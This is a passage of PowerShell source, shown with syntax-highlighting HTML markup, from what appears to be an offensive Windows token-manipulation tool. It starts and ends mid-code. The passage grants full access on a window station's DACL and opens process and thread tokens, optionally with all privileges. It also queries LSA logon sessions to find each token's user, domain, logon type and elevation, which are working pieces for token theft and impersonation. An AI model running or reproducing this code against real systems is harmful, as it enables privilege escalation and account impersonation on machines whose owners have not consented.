punctuation">)</span>            <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::FreeHGlobal<span class="token punctuation">(</span><span class="token variable">$TrusteePtr</span><span class="token punctuation">)</span>            <span class="token variable">$TrusteeObj</span><span class="token punctuation">.</span>pMultipleTrustee = <span class="token namespace">[IntPtr]</span>::Zero            <span class="token variable">$TrusteeObj</span><span class="token punctuation">.</span>MultipleTrusteeOperation = 0            <span class="token variable">$TrusteeObj</span><span class="token punctuation">.</span>TrusteeForm = <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>TRUSTEE_IS_SID            <span class="token variable">$TrusteeObj</span><span class="token punctuation">.</span>TrusteeType = <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>TRUSTEE_IS_WELL_KNOWN_GROUP            <span class="token variable">$TrusteeObj</span><span class="token punctuation">.</span>ptstrName = <span class="token variable">$pAllUsersSid</span>            <span class="token comment" spellcheck="true">#Give full permission</span>            <span class="token variable">$ExplicitAccessSize</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::SizeOf<span class="token punctuation">(</span><span class="token namespace">[Type]</span><span class="token variable">$EXPLICIT_ACCESS</span><span class="token punctuation">)</span>            <span class="token variable">$ExplicitAccessPtr</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token variable">$ExplicitAccessSize</span><span class="token punctuation">)</span>            <span class="token variable">$ExplicitAccess</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStructure<span class="token punctuation">(</span><span class="token variable">$ExplicitAccessPtr</span><span class="token punctuation">,</span> <span class="token namespace">[Type]</span><span class="token variable">$EXPLICIT_ACCESS</span><span class="token punctuation">)</span>            <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::FreeHGlobal<span class="token punctuation">(</span><span class="token variable">$ExplicitAccessPtr</span><span class="token punctuation">)</span>            <span class="token variable">$ExplicitAccess</span><span class="token punctuation">.</span>grfAccessPermissions = 0xf03ff            <span class="token variable">$ExplicitAccess</span><span class="token punctuation">.</span>grfAccessMode = <span class="token variable">$Win32constants</span><span class="token punctuation">.</span>GRANT_ACCESS            <span class="token variable">$ExplicitAccess</span><span class="token punctuation">.</span>grfInheritance = <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>OBJECT_INHERIT_ACE            <span class="token variable">$ExplicitAccess</span><span class="token punctuation">.</span>Trustee = <span class="token variable">$TrusteeObj</span>            <span class="token namespace">[IntPtr]</span><span class="token variable">$NewDacl</span> = <span class="token namespace">[IntPtr]</span>::Zero            <span class="token variable">$RetVal</span> = <span class="token variable">$SetEntriesInAclW</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span>1<span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$ExplicitAccess</span><span class="token punctuation">,</span> <span class="token variable">$ppDacl</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$NewDacl</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$RetVal</span> <span class="token operator">-ne</span> 0<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token function">Write-Error</span> <span class="token string">"Error calling SetEntriesInAclW: <span class="token variable">$RetVal</span>"</span>            <span class="token punctuation">}</span>            <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::FreeHGlobal<span class="token punctuation">(</span><span class="token variable">$pAllUsersSid</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$NewDacl</span> <span class="token operator">-eq</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">throw</span> <span class="token string">"New DACL is null"</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">#0x7 is window station, change for other types</span>            <span class="token variable">$RetVal</span> = <span class="token variable">$SetSecurityInfo</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$hObject</span><span class="token punctuation">,</span> 0x7<span class="token punctuation">,</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>DACL_SECURITY_INFORMATION<span class="token punctuation">,</span> <span class="token variable">$ppSidOwner</span><span class="token punctuation">,</span> <span class="token variable">$ppSidGroup</span><span class="token punctuation">,</span> <span class="token variable">$NewDacl</span><span class="token punctuation">,</span> <span class="token variable">$ppSacl</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$RetVal</span> <span class="token operator">-ne</span> 0<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token function">Write-Error</span> <span class="token string">"SetSecurityInfo failed. Return value: <span class="token variable">$RetVal</span>"</span>            <span class="token punctuation">}</span>            <span class="token variable">$LocalFree</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$ppSecurityDescriptor</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> <span class="token function">Out-Null</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">#Get the primary token for the specified processId</span>    <span class="token keyword">function</span> Get<span class="token operator">-</span>PrimaryToken    <span class="token punctuation">{</span>        <span class="token keyword">Param</span><span class="token punctuation">(</span>            <span class="token namespace">[Parameter(Position=0, Mandatory=$true)]</span>            <span class="token namespace">[UInt32]</span>            <span class="token variable">$ProcessId</span><span class="token punctuation">,</span>            <span class="token comment" spellcheck="true">#Open the token with all privileges. Requires SYSTEM because some of the privileges are restricted to SYSTEM.</span>            <span class="token namespace">[Parameter()]</span>            <span class="token namespace">[Switch]</span>            <span class="token variable">$FullPrivs</span>        <span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$FullPrivs</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$TokenPrivs</span> = <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>TOKEN_ALL_ACCESS        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            <span class="token variable">$TokenPrivs</span> = <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>TOKEN_ASSIGN_PRIMARY <span class="token operator">-bor</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>TOKEN_DUPLICATE <span class="token operator">-bor</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>TOKEN_IMPERSONATE <span class="token operator">-bor</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>TOKEN_QUERY         <span class="token punctuation">}</span>        <span class="token variable">$ReturnStruct</span> = <span class="token function">New-Object</span> PSObject        <span class="token variable">$hProcess</span> = <span class="token variable">$OpenProcess</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>PROCESS_QUERY_INFORMATION<span class="token punctuation">,</span> <span class="token boolean">$true</span><span class="token punctuation">,</span> <span class="token namespace">[UInt32]</span><span class="token variable">$ProcessId</span><span class="token punctuation">)</span>        <span class="token variable">$ReturnStruct</span> <span class="token punctuation">|</span> <span class="token function">Add-Member</span> <span class="token operator">-</span>MemberType NoteProperty <span class="token operator">-</span>Name hProcess <span class="token operator">-</span>Value <span class="token variable">$hProcess</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$hProcess</span> <span class="token operator">-eq</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">#If a process is a protected process it cannot be enumerated. This call should only fail for protected processes.</span>            <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token function">Write-Verbose</span> <span class="token string">"Failed to open process handle for ProcessId: <span class="token variable">$ProcessId</span>. ProcessName<span class="token function"> $<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">Get-Process</span> <span class="token operator">-</span>Id <span class="token variable">$ProcessId</span><span class="token punctuation">)</span></span>.Name). Error code: <span class="token variable">$ErrorCode</span> . This is likely because this is a protected process."</span>            <span class="token keyword">return</span> <span class="token variable">$null</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            <span class="token namespace">[IntPtr]</span><span class="token variable">$hProcToken</span> = <span class="token namespace">[IntPtr]</span>::Zero            <span class="token variable">$Success</span> = <span class="token variable">$OpenProcessToken</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$hProcess</span><span class="token punctuation">,</span> <span class="token variable">$TokenPrivs</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$hProcToken</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#Close the handle to hProcess (the process handle)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token variable">$CloseHandle</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$hProcess</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token function">Write-Warning</span> <span class="token string">"Failed to close process handle, this is unexpected. ErrorCode: <span class="token variable">$ErrorCode</span>"</span>            <span class="token punctuation">}</span>            <span class="token variable">$hProcess</span> = <span class="token namespace">[IntPtr]</span>::Zero            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Success</span> <span class="token operator">-eq</span> <span class="token boolean">$false</span> <span class="token operator">-or</span> <span class="token variable">$hProcToken</span> <span class="token operator">-eq</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token function">Write-Warning</span> <span class="token string">"Failed to get processes primary token. ProcessId: <span class="token variable">$ProcessId</span>. ProcessName<span class="token function"> $<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">Get-Process</span> <span class="token operator">-</span>Id <span class="token variable">$ProcessId</span><span class="token punctuation">)</span></span>.Name). Error: <span class="token variable">$ErrorCode</span>"</span>                <span class="token keyword">return</span> <span class="token variable">$null</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>                <span class="token variable">$ReturnStruct</span> <span class="token punctuation">|</span> <span class="token function">Add-Member</span> <span class="token operator">-</span>MemberType NoteProperty <span class="token operator">-</span>Name hProcToken <span class="token operator">-</span>Value <span class="token variable">$hProcToken</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$ReturnStruct</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> Get<span class="token operator">-</span>ThreadToken    <span class="token punctuation">{</span>        <span class="token keyword">Param</span><span class="token punctuation">(</span>            <span class="token namespace">[Parameter(Position=0, Mandatory=$true)]</span>            <span class="token namespace">[UInt32]</span>            <span class="token variable">$ThreadId</span>        <span class="token punctuation">)</span>        <span class="token variable">$TokenPrivs</span> = <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>TOKEN_ALL_ACCESS        <span class="token variable">$RetStruct</span> = <span class="token function">New-Object</span> PSObject        <span class="token namespace">[IntPtr]</span><span class="token variable">$hThreadToken</span> = <span class="token namespace">[IntPtr]</span>::Zero        <span class="token variable">$hThread</span> = <span class="token variable">$OpenThread</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>THREAD_ALL_ACCESS<span class="token punctuation">,</span> <span class="token boolean">$false</span><span class="token punctuation">,</span> <span class="token variable">$ThreadId</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$hThread</span> <span class="token operator">-eq</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$ErrorCode</span> <span class="token operator">-ne</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>ERROR_INVALID_PARAMETER<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#The thread probably no longer exists</span>            <span class="token punctuation">{</span>                <span class="token function">Write-Warning</span> <span class="token string">"Failed to open thread handle for ThreadId: <span class="token variable">$ThreadId</span>. Error code: <span class="token variable">$ErrorCode</span>"</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            <span class="token variable">$Success</span> = <span class="token variable">$OpenThreadToken</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$hThread</span><span class="token punctuation">,</span> <span class="token variable">$TokenPrivs</span><span class="token punctuation">,</span> <span class="token boolean">$false</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$hThreadToken</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token variable">$Success</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$ErrorCode</span> <span class="token operator">-ne</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>ERROR_NO_TOKEN<span class="token punctuation">)</span> <span class="token operator">-and</span>  <span class="token comment" spellcheck="true">#This error is returned when the thread isn't impersonated</span>                 <span class="token punctuation">(</span><span class="token variable">$ErrorCode</span> <span class="token operator">-ne</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>ERROR_INVALID_PARAMETER<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#Probably means the thread was closed</span>                <span class="token punctuation">{</span>                    <span class="token function">Write-Warning</span> <span class="token string">"Failed to call OpenThreadToken for ThreadId: <span class="token variable">$ThreadId</span>. Error code: <span class="token variable">$ErrorCode</span>"</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>                <span class="token function">Write-Verbose</span> <span class="token string">"Successfully queried thread token"</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">#Close the handle to hThread (the thread handle)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token variable">$CloseHandle</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$hThread</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token function">Write-Warning</span> <span class="token string">"Failed to close thread handle, this is unexpected. ErrorCode: <span class="token variable">$ErrorCode</span>"</span>            <span class="token punctuation">}</span>            <span class="token variable">$hThread</span> = <span class="token namespace">[IntPtr]</span>::Zero        <span class="token punctuation">}</span>        <span class="token variable">$RetStruct</span> <span class="token punctuation">|</span> <span class="token function">Add-Member</span> <span class="token operator">-</span>MemberType NoteProperty <span class="token operator">-</span>Name hThreadToken <span class="token operator">-</span>Value <span class="token variable">$hThreadToken</span>        <span class="token keyword">return</span> <span class="token variable">$RetStruct</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">#Gets important information about the token such as the logon type associated with the logon</span>    <span class="token keyword">function</span> Get<span class="token operator">-</span>TokenInformation    <span class="token punctuation">{</span>        <span class="token keyword">Param</span><span class="token punctuation">(</span>            <span class="token namespace">[Parameter(Position=0, Mandatory=$true)]</span>            <span class="token namespace">[IntPtr]</span>            <span class="token variable">$hToken</span>        <span class="token punctuation">)</span>        <span class="token variable">$ReturnObj</span> = <span class="token variable">$null</span>        <span class="token variable">$TokenStatsSize</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::SizeOf<span class="token punctuation">(</span><span class="token namespace">[Type]</span><span class="token variable">$TOKEN_STATISTICS</span><span class="token punctuation">)</span>        <span class="token namespace">[IntPtr]</span><span class="token variable">$TokenStatsPtr</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token variable">$TokenStatsSize</span><span class="token punctuation">)</span>        <span class="token namespace">[UInt32]</span><span class="token variable">$RealSize</span> = 0        <span class="token variable">$Success</span> = <span class="token variable">$GetTokenInformation</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$hToken</span><span class="token punctuation">,</span> <span class="token variable">$TOKEN_INFORMATION_CLASS</span>::TokenStatistics<span class="token punctuation">,</span> <span class="token variable">$TokenStatsPtr</span><span class="token punctuation">,</span> <span class="token variable">$TokenStatsSize</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$RealSize</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token variable">$Success</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token function">Write-Warning</span> <span class="token string">"GetTokenInformation failed. Error code: <span class="token variable">$ErrorCode</span>"</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            <span class="token variable">$TokenStats</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStructure<span class="token punctuation">(</span><span class="token variable">$TokenStatsPtr</span><span class="token punctuation">,</span> <span class="token namespace">[Type]</span><span class="token variable">$TOKEN_STATISTICS</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#Query LSA to determine what the logontype of the session is that the token corrosponds to, as well as the username/domain of the logon</span>            <span class="token variable">$LuidPtr</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::SizeOf<span class="token punctuation">(</span><span class="token namespace">[Type]</span><span class="token variable">$LUID</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::StructureToPtr<span class="token punctuation">(</span><span class="token variable">$TokenStats</span><span class="token punctuation">.</span>AuthenticationId<span class="token punctuation">,</span> <span class="token variable">$LuidPtr</span><span class="token punctuation">,</span> <span class="token boolean">$false</span><span class="token punctuation">)</span>            <span class="token namespace">[IntPtr]</span><span class="token variable">$LogonSessionDataPtr</span> = <span class="token namespace">[IntPtr]</span>::Zero            <span class="token variable">$ReturnVal</span> = <span class="token variable">$LsaGetLogonSessionData</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$LuidPtr</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$LogonSessionDataPtr</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$ReturnVal</span> <span class="token operator">-ne</span> 0 <span class="token operator">-and</span> <span class="token variable">$LogonSessionDataPtr</span> <span class="token operator">-eq</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token function">Write-Warning</span> <span class="token string">"Call to LsaGetLogonSessionData failed. Error code: <span class="token variable">$ReturnVal</span>. LogonSessionDataPtr = <span class="token variable">$LogonSessionDataPtr</span>"</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>                <span class="token variable">$LogonSessionData</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStructure<span class="token punctuation">(</span><span class="token variable">$LogonSessionDataPtr</span><span class="token punctuation">,</span> <span class="token namespace">[Type]</span><span class="token variable">$SECURITY_LOGON_SESSION_DATA</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$LogonSessionData</span><span class="token punctuation">.</span>Username<span class="token punctuation">.</span>Buffer <span class="token operator">-ne</span> <span class="token namespace">[IntPtr]</span>::Zero <span class="token operator">-and</span>                     <span class="token variable">$LogonSessionData</span><span class="token punctuation">.</span>LoginDomain<span class="token punctuation">.</span>Buffer <span class="token operator">-ne</span> <span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    <span class="token comment" spellcheck="true">#Get the username and domainname associated with the token</span>                    <span class="token variable">$Username</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStringUni<span class="token punctuation">(</span><span class="token variable">$LogonSessionData</span><span class="token punctuation">.</span>Username<span class="token punctuation">.</span>Buffer<span class="token punctuation">,</span> <span class="token variable">$LogonSessionData</span><span class="token punctuation">.</span>Username<span class="token punctuation">.</span>Length<span class="token operator">/</span>2<span class="token punctuation">)</span>                    <span class="token variable">$Domain</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStringUni<span class="token punctuation">(</span><span class="token variable">$LogonSessionData</span><span class="token punctuation">.</span>LoginDomain<span class="token punctuation">.</span>Buffer<span class="token punctuation">,</span> <span class="token variable">$LogonSessionData</span><span class="token punctuation">.</span>LoginDomain<span class="token punctuation">.</span>Length<span class="token operator">/</span>2<span class="token punctuation">)</span>                    <span class="token comment" spellcheck="true">#If UserName is for the computer account, figure out what account it actually is (SYSTEM, NETWORK SERVICE)</span>                    <span class="token comment" spellcheck="true">#Only do this for the computer account because other accounts return correctly. Also, doing this for a domain account </span>                    <span class="token comment" spellcheck="true">#results in querying the domain controller which is unwanted.</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Username</span> <span class="token operator">-</span>ieq <span class="token string"><span class="token function">"$<span class="token punctuation">(</span><span class="token variable">$env</span>:COMPUTERNAME<span class="token punctuation">)</span></span>`$"</span><span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                        <span class="token namespace">[UInt32]</span><span class="token variable">$Size</span> = 100                        <span class="token namespace">[UInt32]</span><span class="token variable">$NumUsernameChar</span> = <span class="token variable">$Size</span> <span class="token operator">/</span> 2                        <span class="token namespace">[UInt32]</span><span class="token variable">$NumDomainChar</span> = <span class="token variable">$Size</span> <span class="token operator">/</span> 2                        <span class="token namespace">[UInt32]</span><span class="token variable">$SidNameUse</span> = 0                        <span class="token variable">$UsernameBuffer</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token variable">$Size</span><span class="token punctuation">)</span>                        <span class="token variable">$DomainBuffer</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token variable">$Size</span><span class="token punctuation">)</span>                        <span class="token variable">$Success</span> = <span class="token variable">$LookupAccountSidW</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">,</span> <span class="token variable">$LogonSessionData</span><span class="token punctuation">.</span>Sid<span class="token punctuation">,</span> <span class="token variable">$UsernameBuffer</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$NumUsernameChar</span><span class="token punctuation">,</span> <span class="token variable">$DomainBuffer</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$NumDomainChar</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$SidNameUse</span><span class="token punctuation">)</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Success</span><span class="token punctuation">)</span>                        <span class="token punctuation">{</span>                            <span class="token variable">$Username</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStringUni<span class="token punctuation">(</span><span class="token variable">$UsernameBuffer</span><span class="token punctuation">)</span>                            <span class="token variable">$Domain</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStringUni<span class="token punctuation">(</span><span class="token variable">$DomainBuffer</span><span class="token punctuation">)</span>                        <span class="token punctuation">}</span>                        <span class="token keyword">else</span>                        <span class="token punctuation">{</span>                            <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>                            <span class="token function">Write-Warning</span> <span class="token string">"Error calling LookupAccountSidW. Error code: <span class="token variable">$ErrorCode</span>"</span>                        <span class="token punctuation">}</span>                        <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::FreeHGlobal<span class="token punctuation">(</span><span class="token variable">$UsernameBuffer</span><span class="token punctuation">)</span>                        <span class="token variable">$UsernameBuffer</span> = <span class="token namespace">[IntPtr]</span>::Zero                        <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::FreeHGlobal<span class="token punctuation">(</span><span class="token variable">$DomainBuffer</span><span class="token punctuation">)</span>                        <span class="token variable">$DomainBuffer</span> = <span class="token namespace">[IntPtr]</span>::Zero                    <span class="token punctuation">}</span>                    <span class="token variable">$ReturnObj</span> = <span class="token function">New-Object</span> PSObject                    <span class="token variable">$ReturnObj</span> <span class="token punctuation">|</span> <span class="token function">Add-Member</span> <span class="token operator">-</span><span class="token function">Type</span> NoteProperty <span class="token operator">-</span>Name Domain <span class="token operator">-</span>Value <span class="token variable">$Domain</span>                    <span class="token variable">$ReturnObj</span> <span class="token punctuation">|</span> <span class="token function">Add-Member</span> <span class="token operator">-</span><span class="token function">Type</span> NoteProperty <span class="token operator">-</span>Name Username <span class="token operator">-</span>Value <span class="token variable">$Username</span>                        <span class="token variable">$ReturnObj</span> <span class="token punctuation">|</span> <span class="token function">Add-Member</span> <span class="token operator">-</span><span class="token function">Type</span> NoteProperty <span class="token operator">-</span>Name hToken <span class="token operator">-</span>Value <span class="token variable">$hToken</span>                    <span class="token variable">$ReturnObj</span> <span class="token punctuation">|</span> <span class="token function">Add-Member</span> <span class="token operator">-</span><span class="token function">Type</span> NoteProperty <span class="token operator">-</span>Name LogonType <span class="token operator">-</span>Value <span class="token variable">$LogonSessionData</span><span class="token punctuation">.</span>LogonType                    <span class="token comment" spellcheck="true">#Query additional info about the token such as if it is elevated</span>                    <span class="token variable">$ReturnObj</span> <span class="token punctuation">|</span> <span class="token function">Add-Member</span> <span class="token operator">-</span><span class="token function">Type</span> NoteProperty <span class="token operator">-</span>Name IsElevated <span class="token operator">-</span>Value <span class="token boolean">$false</span>                    <span class="token variable">$TokenElevationSize</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::SizeOf<span class="token punctuation">(</span><span class="token namespace">[Type]</span><span class="token variable">$TOKEN_ELEVATION</span><span class="token punctuation">)</span>                    <span class="token variable">$TokenElevationPtr</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token variable">$TokenElevationSize</span><span class="token punctuation">)</span>                    <span class="token namespace">[UInt32]</span><span class="token variable">$RealSize</span> = 0                    <span class="token variable">$Success</span> = <span class="token variable">$GetTokenInformation</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$hToken</span><span class="token punctuation">,</span> <span class="token variable">$TOKEN_INFORMATION_CLASS</span>::TokenElevation<span class="token punctuation">,</span> <span class="token variable">$TokenElevationPtr</span><span class="token punctuation">,</span> <span class="token variable">$TokenElevationSize</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$RealSize</span><span class="token punctuation">)</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token variable">$Success</span><span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                        <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>                        <span class="token function">Write-Warning</span> <span class="token string">"GetTokenInformation failed to retrieve TokenElevation status. ErrorCode: <span class="token variable">$ErrorCode</span>"</span>                     <span class="token punctuation">}</span>                    <span class="token keyword">else</span>                    <span class="token punctuation">{</span>                        <span class="token variable">$TokenElevation</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStructure<span class="token punctuation">(</span><span class="token variable">$TokenelevationPtr</span><span class="token punctuation">,</span> <span class="token namespace">[Type]</span><span class="token variable">$TOKEN_ELEVATION</span><span class="token punctuation">)</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$TokenElevation</span><span class="token punctuation">.</span>TokenIsElevated <span class="token operator">-ne</span> 0<span class="token punctuation">)</span>                        <span class="token punctuation">{</span>                            <span class="token variable">$ReturnObj</span><span class="token punctuation">.</span>IsElevated = <span class="token boolean">$true</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                    <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::FreeHGlobal<span class="token punctuation">(</span><span class="token variable">$TokenElevationPtr</span><span class="token punctuation">)</span>                    <span class="token comment" spellcheck="true">#Query the token type to determine if the token is a primary or 